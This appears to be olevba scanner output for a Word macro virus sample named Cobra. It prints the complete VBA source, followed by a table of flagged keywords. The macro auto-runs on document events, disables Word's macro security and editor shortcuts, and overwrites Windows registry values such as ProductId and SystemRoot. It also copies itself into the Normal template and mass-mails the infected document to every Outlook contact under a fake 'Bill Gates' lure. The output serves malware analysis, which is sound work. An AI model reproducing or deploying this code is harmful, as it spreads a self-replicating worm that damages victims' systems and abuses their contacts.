olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.w
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Day_2.cls 
in file: Virus.MSWord.Cobra.w - OLE stream: 'Macros/VBA/Day_2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_New()
Call A0AX
End Sub
Private Sub Document_Close()
Call A0AX
End Sub
Private Sub Document_Open()
Call A0AX
End Sub
Private Sub A0AX()
On Error Resume Next
CustomizationContext = NormalTemplate
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Lavel") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Lavel") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False
End If
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") <> "Alina Liton" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Alina Liton"
End If
InsFat = Date
If Not IsDate(System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "FatehIns")) Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "FatehIns") = Date
Else
InsFat = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "FatehIns")
End If
TotDy = DateValue(Date) - DateValue(InsFat)
If TotDy > 30 Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "ProductId") = "Fateha-Liton-Alina"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "SystemRoot") = "C:\A0AAX"
End If
Set ADC1 = ActiveDocument.VBProject.VBComponents(1): Set NDC1 = NormalTemplate.VBProject.VBComponents(1)
ExportFile1 = NormalTemplate.Path + "\Fateha.dll": ExportFile2 = NormalTemplate.Path + "\Liton.dll"
If UCase(Dir(ExportFile1)) = UCase("Fateha.dll") Then Kill ExportFile1
If UCase(Dir(ExportFile2)) = UCase("Liton.dll") Then Kill ExportFile2
If ADC1.CodeModule.CountOfLines > 0 Then ADC1.Export (ExportFile1)
If NDC1.CodeModule.CountOfLines > 0 Then NDC1.Export (ExportFile2)
If ADC1.CodeModule.CountOfLines > 0 Then
For i = 1 To ADC1.CodeModule.CountOfLines: ADC1.CodeModule.DeleteLines 1: Next
End If
ADC1.CodeModule.AddFromFile (ExportFile2)
If ADC1.CodeModule.CountOfLines > 0 Then
For i = 1 To 4: ADC1.CodeModule.DeleteLines 1: Next
Else
ADC1.CodeModule.AddFromFile (ExportFile1)
For i = 1 To 4: ADC1.CodeModule.DeleteLines 1: Next: End If
If NDC1.CodeModule.CountOfLines > 0 Then
For i = 1 To NDC1.CodeModule.CountOfLines: NDC1.CodeModule.DeleteLines 1: Next
End If
NDC1.CodeModule.AddFromFile (ExportFile1)
If NDC1.CodeModule.CountOfLines > 0 Then
For i = 1 To 4: NDC1.CodeModule.DeleteLines 1: Next
Else
NDC1.CodeModule.AddFromFile (ExportFile1)
For i = 1 To 4: NDC1.CodeModule.DeleteLines 1: Next
End If
WD = WeekDay(Date)
WD = "Day_" + Trim(Str(WD))
If NDC1.Name <> WD Then NDC1.Name = WD
If ADC1.Name <> "DT" & Trim(Str(Month(Date))) + "_" + Trim(Str(Year(Date))) Then ADC1.Name = "DT" & Trim(Str(Month(Date))) + "_" + Trim(Str(Year(Date)))
Dim UDO, DMN, BUOS
Set UDO = CreateObject("Outlook.Application")
Set DMN = UDO.GetNameSpace("MAPI")
DMN.Logon "profile", "password"
For l = DMN.AddressLists.Count To 1 Step -1
Set ADB = DMN.AddressLists(l)
i = 0
Set BUOS = UDO.CreateItem(0)
For t = ADB.AdressEntries.Count To 1 Step -1
o = ADB.AddressEntries(i)
BUOS.Recipients.Add o
i = i + 1
If i = ADB.AddressEntries.Count Then
t = 1
End If
Next t
Subj = "How to develop a customize Software?"
Bod = "Attached document is an important document for any person." + Chr(13) + " It's help you how to develop a customize Software, like, Windows 2000, Office 2000," + Chr(13) + "SmartSuite97, Mcafee, Norton etc." + Chr(13) + "If you complete the instruction of attached document within 2400 hrs you will get 100 Billion Dollars from Microsoft Corp." + Chr(13) + Chr(13) + "Thanks," + Chr(13) + "Bill Gates"
BUOS.Subject = Subj
BUOS.Body = Bod
BUOS.Attachments.Add ActiveDocument.FullName
BUOS.Send
o = ""
Next l
DMN.Logoff
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Fateha.dll          |Executable file name                         |
|IOC       |Liton.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

